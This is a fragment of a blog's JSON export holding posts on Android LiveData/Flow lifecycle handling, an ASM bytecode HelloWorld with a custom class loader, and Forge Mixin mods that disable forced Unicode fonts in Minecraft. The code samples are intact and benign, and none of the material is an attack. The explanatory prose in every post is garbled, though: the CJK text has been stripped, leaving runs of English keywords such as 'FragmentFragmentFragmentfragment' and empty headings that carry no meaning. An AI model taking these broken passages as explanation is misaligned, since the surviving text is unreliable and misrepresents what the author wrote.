FragmentLifecycleOwner</h2><p>Livedatalifecycleowner<code>DESTORYED</code></p>\n<p>FragmentFragmentFragmentfragmentfragmentFragmentFragmentfragmentfragmentview<code>onViewCreated</code><code>onCreate</code>,fragmentviewfragmentfragmentviewfragmentfragment<code>onViewCreated</code></p>\n<p><code>viewLifecycleOwner</code>view</p>\n<h2 id=\"-launchWhenX\"><a href=\"#-launchWhenX\" class=\"headerlink\" title=\" launchWhenX\"></a> launchWhenX</h2><h3 id=\"Flow-vs-LiveData\"><a href=\"#Flow-vs-LiveData\" class=\"headerlink\" title=\"Flow vs. LiveData\"></a>Flow vs. LiveData</h3><p>FlowLiveDataLiveDataandroid jetpackandroid</p>\n<ul>\n<li> - lifecycleOwnerdestory</li>\n<li> - lifecycleOwnerSTARTED</li>\n</ul>\n<p>FlowLiveData</p>\n<p>FlowCoroutineScope<code>lifecycle-runtime-ktx</code>lifecycleOwner<code>lifecycleScope</code>lifecycleScopeFlowLiveDatalifecycleScope</p>\n<p></p>\n<p><code>launchWhenX</code><code>PAUSED</code><code>STARTED</code>,<code>RESUMED</code></p>\n<p>flow</p>\n<p></p>\n<h3 id=\"repeatOnLifecycle\"><a href=\"#repeatOnLifecycle\" class=\"headerlink\" title=\"repeatOnLifecycle\"></a>repeatOnLifecycle</h3><blockquote>\n<p>lifecycle-runtime-ktx  <code>2.4.0-alpha01</code>  <code>lifecyle.repeatOnLifecycle</code>  X  X <strong></strong></p>\n</blockquote>\n<p>collect</p>\n<p>FlowFlowLiveData: FlowLiveData</p>\n<p>LiveDataFlowLiveData</p>\n<p>flow<code>flowWithLifecycle(LifecycleOwner)</code></p>\n<h2 id=\"-onViewCreated\"><a href=\"#-onViewCreated\" class=\"headerlink\" title=\" onViewCreated\"></a> onViewCreated</h2><p> MVVM , ViewModel  View  Model</p>\n<ul>\n<li>View  ViewModel </li>\n<li>View  DataBinding  LiveData  ViewModel </li>\n</ul>\n<p> ViewModel  <code>onViewCreated</code>  ViewModel  <code>onViewCreated</code>  ViewModel  <code>onViewCreated</code>  View  ViewModel  View View  View </p>\n<blockquote>\n<p>ViewModel  <code>init&#123;&#125;</code>  <code>ViewModelScope</code> </p>\n</blockquote>\n<h2 id=\"-LiveData-amp-StateFlowEvents\"><a href=\"#-LiveData-amp-StateFlowEvents\" class=\"headerlink\" title=\" LiveData &amp; StateFlowEvents\"></a> LiveData &amp; StateFlowEvents</h2><p>LiveDataStateFlow</p>\n<p>LiveData</p>\n<p>LiveDataStateFlowLiveDataStateFlowbugStateFlow<strong></strong></p>\n<h2 id=\"-RepositoryLiveData\"><a href=\"#-RepositoryLiveData\" class=\"headerlink\" title=\" RepositoryLiveData\"></a> RepositoryLiveData</h2><p>RxJavaFlowLiveDataLiveData:</p>\n<ul>\n<li>lifecyclelifecycleOwnerobserveForever</li>\n<li> </li>\n</ul>\n<h2 id=\"-ViewModel\"><a href=\"#-ViewModel\" class=\"headerlink\" title=\" ViewModel\"></a> ViewModel</h2><ul>\n<li>Mutable</li>\n<li>suspend</li>\n</ul>\n"},{"title":"ASMHelloWorld","date":"2021-10-11T03:46:08.000Z","author":"","hide":false,"summary":"asmhelloworld","_content":"\n# ASMHelloWorld\n\nASMASMHelloWorld\nASM\n\n## \n\n```kotlin\npublic class ASMTest {\n\n    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {\n        byte[] bytes = generate();\n        MyClassLoader cl = new MyClassLoader();\n        Class<?> clazz = cl.defineClass(\"team.redrock.coldrain.asmtest.HelloWorldASM\", bytes);\n        Method m = clazz.getMethod(\"main\", String[].class);\n        m.invoke(null, new Object[]{new String[]{}});\n    }\n\n    static byte[] generate() {\n        ClassWriter cw = new ClassWriter(0);\n        cw.visit(Opcodes.V1_8, Opcodes.ACC_PUBLIC, \"team/redrock/coldrain/asmtest/HelloWorldASM\", null, \"java/lang/Object\", null);\n        MethodVisitor mv = cw.visitMethod(Opcodes.ACC_PUBLIC + Opcodes.ACC_STATIC, \"main\", \"([Ljava/lang/String;)V\", null, null);\n        mv.visitFieldInsn(Opcodes.GETSTATIC, \"java/lang/System\", \"out\", \"Ljava/io/PrintStream;\");\n        mv.visitLdcInsn(\"Hello ASM!\");\n        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, \"java/io/PrintStream\", \"println\", \"(Ljava/lang/String;)V\", false);\n        mv.visitInsn(Opcodes.RETURN);\n        mv.visitMaxs(2, 1);\n        mv.visitEnd();\n        cw.visitEnd();\n        return cw.toByteArray();\n    }\n\n    static class MyClassLoader extends ClassLoader {\n        public Class<?> defineClass(String name, byte[] b) {\n            return super.defineClass(name, b, 0, b.length);\n        }\n    }\n}\n```","source":"_posts/hello-asm.md","raw":"---\ntitle: ASMHelloWorld\ndate: 2021-10-11 11:46:08\nauthor: \nhide: false\nsummary: asmhelloworld\ncategories: \ntags:\n  - \n  - ASM\n  - Java\n---\n\n# ASMHelloWorld\n\nASMASMHelloWorld\nASM\n\n## \n\n```kotlin\npublic class ASMTest {\n\n    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {\n        byte[] bytes = generate();\n        MyClassLoader cl = new MyClassLoader();\n        Class<?> clazz = cl.defineClass(\"team.redrock.coldrain.asmtest.HelloWorldASM\", bytes);\n        Method m = clazz.getMethod(\"main\", String[].class);\n        m.invoke(null, new Object[]{new String[]{}});\n    }\n\n    static byte[] generate() {\n        ClassWriter cw = new ClassWriter(0);\n        cw.visit(Opcodes.V1_8, Opcodes.ACC_PUBLIC, \"team/redrock/coldrain/asmtest/HelloWorldASM\", null, \"java/lang/Object\", null);\n        MethodVisitor mv = cw.visitMethod(Opcodes.ACC_PUBLIC + Opcodes.ACC_STATIC, \"main\", \"([Ljava/lang/String;)V\", null, null);\n        mv.visitFieldInsn(Opcodes.GETSTATIC, \"java/lang/System\", \"out\", \"Ljava/io/PrintStream;\");\n        mv.visitLdcInsn(\"Hello ASM!\");\n        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, \"java/io/PrintStream\", \"println\", \"(Ljava/lang/String;)V\", false);\n        mv.visitInsn(Opcodes.RETURN);\n        mv.visitMaxs(2, 1);\n        mv.visitEnd();\n        cw.visitEnd();\n        return cw.toByteArray();\n    }\n\n    static class MyClassLoader extends ClassLoader {\n        public Class<?> defineClass(String name, byte[] b) {\n            return super.defineClass(name, b, 0, b.length);\n        }\n    }\n}\n```","slug":"hello-asm","published":1,"updated":"2021-11-13T16:17:09.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jtg0012sfkl32lr2xt5","content":"<h1 id=\"ASMHelloWorld\"><a href=\"#ASMHelloWorld\" class=\"headerlink\" title=\"ASMHelloWorld\"></a>ASMHelloWorld</h1><p>ASMASMHelloWorld<br>ASM</p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> ASMTest <span class=\"token punctuation\">{</span>\n\n    <span class=\"token keyword\">public</span> static void <span class=\"token function\">main</span><span class=\"token punctuation\">(</span>String<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> throws NoSuchMethodException<span class=\"token punctuation\">,</span> InvocationTargetException<span class=\"token punctuation\">,</span> IllegalAccessException <span class=\"token punctuation\">{</span>\n        byte<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> bytes <span class=\"token operator\">=</span> <span class=\"token function\">generate</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        MyClassLoader cl <span class=\"token operator\">=</span> new <span class=\"token function\">MyClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        Class<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span> clazz <span class=\"token operator\">=</span> cl<span class=\"token punctuation\">.</span><span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"team.redrock.coldrain.asmtest.HelloWorldASM\"</span><span class=\"token punctuation\">,</span> bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        Method m <span class=\"token operator\">=</span> clazz<span class=\"token punctuation\">.</span><span class=\"token function\">getMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"main\"</span><span class=\"token punctuation\">,</span> String<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>class<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        m<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> new Object<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">{</span>new String<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    static byte<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token function\">generate</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        ClassWriter cw <span class=\"token operator\">=</span> new <span class=\"token function\">ClassWriter</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        cw<span class=\"token punctuation\">.</span><span class=\"token function\">visit</span><span class=\"token punctuation\">(</span>Opcodes<span class=\"token punctuation\">.</span>V1_8<span class=\"token punctuation\">,</span> Opcodes<span class=\"token punctuation\">.</span>ACC_PUBLIC<span class=\"token punctuation\">,</span> <span class=\"token string\">\"team/redrock/coldrain/asmtest/HelloWorldASM\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"java/lang/Object\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        MethodVisitor mv <span class=\"token operator\">=</span> cw<span class=\"token punctuation\">.</span><span class=\"token function\">visitMethod</span><span class=\"token punctuation\">(</span>Opcodes<span class=\"token punctuation\">.</span>ACC_PUBLIC <span class=\"token operator\">+</span> Opcodes<span class=\"token punctuation\">.</span>ACC_STATIC<span class=\"token punctuation\">,</span> <span class=\"token string\">\"main\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"([Ljava/lang/String;)V\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitFieldInsn</span><span class=\"token punctuation\">(</span>Opcodes<span class=\"token punctuation\">.</span>GETSTATIC<span class=\"token punctuation\">,</span> <span class=\"token string\">\"java/lang/System\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"out\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Ljava/io/PrintStream;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitLdcInsn</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello ASM!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitMethodInsn</span><span class=\"token punctuation\">(</span>Opcodes<span class=\"token punctuation\">.</span>INVOKEVIRTUAL<span class=\"token punctuation\">,</span> <span class=\"token string\">\"java/io/PrintStream\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"println\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"(Ljava/lang/String;)V\"</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitInsn</span><span class=\"token punctuation\">(</span>Opcodes<span class=\"token punctuation\">.</span>RETURN<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitMaxs</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitEnd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        cw<span class=\"token punctuation\">.</span><span class=\"token function\">visitEnd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> cw<span class=\"token punctuation\">.</span><span class=\"token function\">toByteArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    static <span class=\"token keyword\">class</span> MyClassLoader extends ClassLoader <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">public</span> Class<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span> <span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span>String name<span class=\"token punctuation\">,</span> byte<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> b<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">return</span> <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":"<h1 id=\"ASMHelloWorld\"><a href=\"#ASMHelloWorld\" class=\"headerlink\" title=\"ASMHelloWorld\"></a>ASMHelloWorld</h1><p>ASMASMHelloWorld<br>ASM</p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> ASMTest <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token keyword\">public</span> static void <span class=\"token function\">main</span><span class=\"token punctuation\">(</span>String<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> throws NoSuchMethodException<span class=\"token punctuation\">,</span> InvocationTargetException<span class=\"token punctuation\">,</span> IllegalAccessException <span class=\"token punctuation\">&#123;</span>\n        byte<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> bytes <span class=\"token operator\">=</span> <span class=\"token function\">generate</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        MyClassLoader cl <span class=\"token operator\">=</span> new <span class=\"token function\">MyClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        Class<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span><span class=\"token operator\">></span> clazz <span class=\"token operator\">=</span> cl<span class=\"token punctuation\">.</span><span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"team.redrock.coldrain.asmtest.HelloWorldASM\"</span><span class=\"token punctuation\">,</span> bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        Method m <span class=\"token operator\">=</span> clazz<span class=\"token punctuation\">.</span><span class=\"token function\">getMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"main\"</span><span class=\"token punctuation\">,</span> String<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>class<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        m<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> new Object<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span>new String<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    static byte<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token function\">generate</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        ClassWriter cw <span class=\"token operator\">=</span> new <span class=\"token function\">ClassWriter</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        cw<span class=\"token punctuation\">.</span><span class=\"token function\">visit</span><span class=\"token punctuation\">(</span>Opcodes<span class=\"token punctuation\">.</span>V1_8<span class=\"token punctuation\">,</span> Opcodes<span class=\"token punctuation\">.</span>ACC_PUBLIC<span class=\"token punctuation\">,</span> <span class=\"token string\">\"team/redrock/coldrain/asmtest/HelloWorldASM\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"java/lang/Object\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        MethodVisitor mv <span class=\"token operator\">=</span> cw<span class=\"token punctuation\">.</span><span class=\"token function\">visitMethod</span><span class=\"token punctuation\">(</span>Opcodes<span class=\"token punctuation\">.</span>ACC_PUBLIC <span class=\"token operator\">+</span> Opcodes<span class=\"token punctuation\">.</span>ACC_STATIC<span class=\"token punctuation\">,</span> <span class=\"token string\">\"main\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"([Ljava/lang/String;)V\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitFieldInsn</span><span class=\"token punctuation\">(</span>Opcodes<span class=\"token punctuation\">.</span>GETSTATIC<span class=\"token punctuation\">,</span> <span class=\"token string\">\"java/lang/System\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"out\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Ljava/io/PrintStream;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitLdcInsn</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello ASM!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitMethodInsn</span><span class=\"token punctuation\">(</span>Opcodes<span class=\"token punctuation\">.</span>INVOKEVIRTUAL<span class=\"token punctuation\">,</span> <span class=\"token string\">\"java/io/PrintStream\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"println\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"(Ljava/lang/String;)V\"</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitInsn</span><span class=\"token punctuation\">(</span>Opcodes<span class=\"token punctuation\">.</span>RETURN<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitMaxs</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitEnd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        cw<span class=\"token punctuation\">.</span><span class=\"token function\">visitEnd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> cw<span class=\"token punctuation\">.</span><span class=\"token function\">toByteArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    static <span class=\"token keyword\">class</span> MyClassLoader extends ClassLoader <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">public</span> Class<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span><span class=\"token operator\">></span> <span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span>String name<span class=\"token punctuation\">,</span> byte<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> b<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>"},{"title":"Hello Minecraft Forge & Mixin!","date":"2021-12-29T16:00:00.000Z","author":"","hide":false,"summary":"Forge Mod,Mixin","_content":"\n# Hello Minecraft Forge & Mixin!\n\n>  Unicode \n>\n> Forge\n\n## Forge\n\n> Forge ModBukkit\n>\n>  1.121.16forge\n>\n> \n>\n> Bukkitforge mod\n\nforgeForgeGradle mdkgradle\n\nmcbbs[[1.17.1-1.7.10\\] Minecraft [Forge|Fabric] -  - Minecraft() - (mcbbs.net)](https://www.mcbbs.net/thread-896542-1-1.html)gradle\n\nForge\n\n\n\n\n\n## Mixin\n\n> MixinSpongePoweredjavaagentasmMixinMinecraft\n>\n> Bukkit APIBukkit API\n>\n> Forge APIForgeAPI\n>\n> ForgeMixinForge1.16ForgeMixin\n>\n> MojangMinecraftMinecraftMinecraft\n>\n> Forge\n>\n> MixinBukkit\n>\n> Mixin\n\nMixinMixin\n\nMixin[[\\][]MixinMinecraft -  - Minecraft() - (mcbbs.net)](https://www.mcbbs.net/thread-833646-1-1.html)\n\nMixin\n\n1.16Forge Mod\n\nrelease note\n\n[ Mixin  0.8  ModLauncher  | IzzelAliz's Blog](https://izzel.io/2020/02/06/mixin-0-8-guide/)\n\n[Release Notes Mixin 0.8  SpongePowered/Mixin Wiki (github.com)](https://github.com/SpongePowered/Mixin/wiki/Release-Notes---Mixin-0.8)\n\nMixin\n\n> \n>\n> 1.MixinConnector\n>\n> 2.MixinRefmap\n>\n> 3.MixinAnnoationProcessor\n>\n> 4.Mixin\n>\n> MixinMixin Pakage\n\n\n\n[mouse0w0/forge-mixin-example: An example for using Mixin in Minecraft Forge 1.12.2 (github.com)](https://github.com/mouse0w0/forge-mixin-example)\n\n## \n\n\n\nMixin\n\n### \n\nbooleanUnicode\n\n~~~java\n\npackage me.asgard.rain.afu.mixin;\n\nimport com.google.common.collect.ImmutableMap;\nimport net.minecraft.client.Minecraft;\nimport net.minecraft.client.gui.fonts.FontResourceManager;\nimport org.spongepowered.asm.mixin.Final;\nimport org.spongepowered.asm.mixin.Mixin;\nimport org.spongepowered.asm.mixin.Overwrite;\nimport org.spongepowered.asm.mixin.Shadow;\n\nimport java.io.IOException;\n\n/**\n * me.asgard.rain.afu.GameSettingMixin\n * AntiForceUnicode\n *\n * @author \n * @since 2021/12/29 13:48\n **/\n@Mixin(Minecraft.class)\npublic abstract class MinecraftMixin {\n\n    @Final\n    @Shadow\n    private FontResourceManager fontManager;\n\n    /**\n     * @author Rain\n     * @reason force disable force unicode\n     */\n    @Overwrite\n    public boolean isEnforceUnicode() {\n        return false;\n    }\n\n    /**\n     * @author Rain\n     * @reason force disable force unicode\n     */\n    @Overwrite\n    public void selectMainFont(boolean p_238209_1_) {\n        fontManager.setRenames(ImmutableMap.of());\n    }\n}\n~~~\n\n### \n\n\n\n\n\n~~~java\npackage me.skymc.fsb.mixin;\n\nimport net.minecraft.client.AbstractOption;\nimport net.minecraft.client.gui.screen.Screen;\nimport net.minecraft.client.gui.widget.Widget;\nimport net.minecraft.client.gui.widget.button.OptionButton;\nimport org.spongepowered.asm.mixin.Mixin;\nimport org.spongepowered.asm.mixin.injection.At;\nimport org.spongepowered.asm.mixin.injection.Inject;\nimport org.spongepowered.asm.mixin.injection.callback.CallbackInfoReturnable;\n\n/**\n * FSB\n * me.skymc.fsb.mixin.MixinScreenLanguage\n *\n * @author \n * @since 2021/12/29 10:54 PM\n */\n@Mixin(Screen.class)\npublic abstract class MixinLanguageScreen {\n\n    @Inject(method = \"addButton\", at = @At(value = \"HEAD\"), cancellable = true)\n    protected <T extends Widget> void addButton(T p_230480_1_, CallbackInfoReturnable<T> c) {\n        if (p_230480_1_ instanceof OptionButton && ((OptionButton) p_230480_1_).getOption() == AbstractOption.FORCE_UNICODE_FONT) {\n            c.setReturnValue(p_230480_1_);\n        }\n    }\n}\n~~~","source":"_posts/hello-forge-and-mixin.md","raw":"---\ntitle: Hello Minecraft Forge & Mixin!\ndate: 2021-12-30\nauthor: \nhide: false\nsummary: Forge Mod,Mixin\ncategories: \ntags:\n  - Minecraft\n  - Forge\n  - \n  - Mixin \n---\n\n# Hello Minecraft Forge & Mixin!\n\n>  Unicode \n>\n> Forge\n\n## Forge\n\n> Forge ModBukkit\n>\n>  1.121.16forge\n>\n> \n>\n> Bukkitforge mod\n\nforgeForgeGradle mdkgradle\n\nmcbbs[[1.17.1-1.7.10\\] Minecraft [Forge|Fabric] -  - Minecraft() - (mcbbs.net)](https://www.mcbbs.net/thread-896542-1-1.html)gradle\n\nForge\n\n\n\n\n\n## Mixin\n\n> MixinSpongePoweredjavaagentasmMixinMinecraft\n>\n> Bukkit APIBukkit API\n>\n> Forge APIForgeAPI\n>\n> ForgeMixinForge1.16ForgeMixin\n>\n> MojangMinecraftMinecraftMinecraft\n>\n> Forge\n>\n> MixinBukkit\n>\n> Mixin\n\nMixinMixin\n\nMixin[[\\][]MixinMinecraft -  - Minecraft() - (mcbbs.net)](https://www.mcbbs.net/thread-833646-1-1.html)\n\nMixin\n\n1.16Forge Mod\n\nrelease note\n\n[ Mixin  0.8  ModLauncher  | IzzelAliz's Blog](https://izzel.io/2020/02/06/mixin-0-8-guide/)\n\n[Release Notes Mixin 0.8  SpongePowered/Mixin Wiki (github.com)](https://github.com/SpongePowered/Mixin/wiki/Release-Notes---Mixin-0.8)\n\nMixin\n\n> \n>\n> 1.MixinConnector\n>\n> 2.MixinRefmap\n>\n> 3.MixinAnnoationProcessor\n>\n> 4.Mixin\n>\n> MixinMixin Pakage\n\n\n\n[mouse0w0/forge-mixin-example: An example for using Mixin in Minecraft Forge 1.12.2 (github.com)](https://github.com/mouse0w0/forge-mixin-example)\n\n## \n\n\n\nMixin\n\n### \n\nbooleanUnicode\n\n~~~java\n\npackage me.asgard.rain.afu.mixin;\n\nimport com.google.common.collect.ImmutableMap;\nimport net.minecraft.client.Minecraft;\nimport net.minecraft.client.gui.fonts.FontResourceManager;\nimport org.spongepowered.asm.mixin.Final;\nimport org.spongepowered.asm.mixin.Mixin;\nimport org.spongepowered.asm.mixin.Overwrite;\nimport org.spongepowered.asm.mixin.Shadow;\n\nimport java.io.IOException;\n\n/**\n * me.asgard.rain.afu.GameSettingMixin\n * AntiForceUnicode\n *\n * @author \n * @since 2021/12/29 13:48\n **/\n@Mixin(Minecraft.class)\npublic abstract class MinecraftMixin {\n\n    @Final\n    @Shadow\n    private FontResourceManager fontManager;\n\n    /**\n     * @author Rain\n     * @reason force disable force unicode\n     */\n    @Overwrite\n    public boolean isEnforceUnicode() {\n        return false;\n    }\n\n    /**\n     * @author Rain\n     * @reason force disable force unicode\n     */\n    @Overwrite\n    public void selectMainFont(boolean p_238209_1_) {\n        fontManager.setRenames(ImmutableMap.of());\n    }\n}\n~~~\n\n### 